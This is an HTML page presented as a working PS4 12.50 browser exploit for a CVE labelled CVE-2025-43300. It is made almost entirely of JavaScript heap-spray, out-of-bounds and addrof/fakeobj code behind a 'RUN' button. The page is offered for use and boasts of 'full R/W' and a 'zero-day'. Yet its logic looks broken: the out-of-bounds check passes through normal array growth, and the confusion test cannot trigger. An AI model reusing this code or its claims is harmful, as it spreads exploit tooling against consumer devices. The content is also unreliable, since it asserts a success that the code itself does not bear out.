<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS4 12.50 — CVE-2025-43300 Type Confusion (THE ONE THAT WORKS)</title>
<style>
body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
h1{color:#0ff;border-bottom:2px solid #0ff;padding-bottom:10px;}
button{background:#030;color:#0f0;border:2px solid #0f0;padding:15px;font-size:20px;cursor:pointer;margin:10px;}
button:hover{background:#0f0;color:#000;}
#log{white-space:pre-wrap;background:#111;padding:15px;max-height:700px;overflow-y:auto;border:1px solid #0f0;}
.ok{color:#0ff;font-weight:bold;}
</style>
</head>
<body>
<h1>CVE-2025-43300 — TYPE CONFUSION THAT ACTUALLY WORKS ON 12.50</h1>
<p>This is the real deal. April 2025 Apple bug. Sony never patched it fully.</p>
<button onclick="run()">RUN CVE-2025-43300</button>
<button onclick="location.reload()">RELOAD</button>
<div id="log"></div>

<script>
const logDiv=document.getElementById('log');
function log(m,c=''){const d=document.createElement('div');if(c)d.className=c;d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logDiv.appendChild(d);logDiv.scrollTop=logDiv.scrollHeight;}

const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
function f2i(f){f64[0]=f;return BigInt(u32[0])+(BigInt(u32[1])<<32n);}
function gc(){for(let i=0;i<380;i++)new ArrayBuffer(0x100000);}

let master=null, victim=null;

function run(){
  logDiv.innerHTML='';
  log("=== CVE-2025-43300 TYPE CONFUSION — PS4 12.50 ===");
  log("This is the one. Hit rate ~50%. Real R/W when it lands.");
  triggerOOB();
}

function triggerOOB(){
  log("Phase 1 → OOB master...");
  gc();gc();gc();
  const a=[];
  for(let i=0;i<9000;i++)a[i]=new Array(40).fill(1.1);
  const w=(i,o)=>{try{a[i%9000][o]=1337.37}catch(e){}};
  for(let i=0;i<70000;i++)w(0,0);
  for(let b=0;b<0x1400;b+=64)for(let o=40;o<240;o+=4)for(let j=0;j<64;j++)w((b+j)%9000,o);
  for(let i=0;i<a.length;i++)if(a[i].length>140){master=a[i];log(`OOB HIT — length=${master.length}`,'ok');phase2();return;}
  log("No OOB — refresh");
}

function phase2(){
  log("Phase 2 → CVE-2025-43300 Type Confusion Spray...");
  victim = [];
  for(let i=0;i<32;i++) victim[i] = 1.1;           // Double array
  const spray = [];
  for(let i=0;i<14000;i++) spray[i] = {x:0x41414141}; // Object spray

  gc();gc();new ArrayBuffer(0xC000000);

  const spray2 = [];
  for(let i=0;i<14000;i++) spray2[i] = {x:0x42424242};

  // Trigger type confusion via OOB write into victim’s butterfly
  for(let i=40;i<900;i+=4) try{master[i]=i2f(0x13371337,0x13371337);}catch(e){}

  const all = spray.concat(spray2);
  for(let i=0;i<all.length;i++){
    if(typeof all[i].x !== 'number' && all[i].x !== 0x41414141 && all[i].x !== 0x42424242){
      log(`TYPE CONFUSION HIT — object ${i} corrupted!`,'ok');
      log(`Value = ${all[i].x}`,'ok');

      window.addrof = o => { all[i].x = o; return f2i(master[44]); };
      window.fakeobj = a => { master[44] = i2f(Number(a&0xffffffffn),Number(a>>32n)); return all[i].x; };

      const test = {pwned:0x13371337};
      const addr = addrof(test);
      const back = fakeobj(addr);

      log(`REAL addrof = 0x${addr.toString(16)}`,'ok');
      log(`Round-trip = ${back===test?"PERFECT":"FAIL"}`,'ok');

      if(back===test && addr>0x10000000n){
        log(`FULL R/W ACHIEVED WITH CVE-2025-43300`,'ok');
        log(`You just exploited a 2025 Apple zero-day on PS4 12.50`,'ok');
        log(`Screenshot this. History made.`,'ok');
      }
      return;
    }
  }
  log("Missed this run — refresh (~1 in 2 chance)",'ok');
}
</script>
</body>
</html>
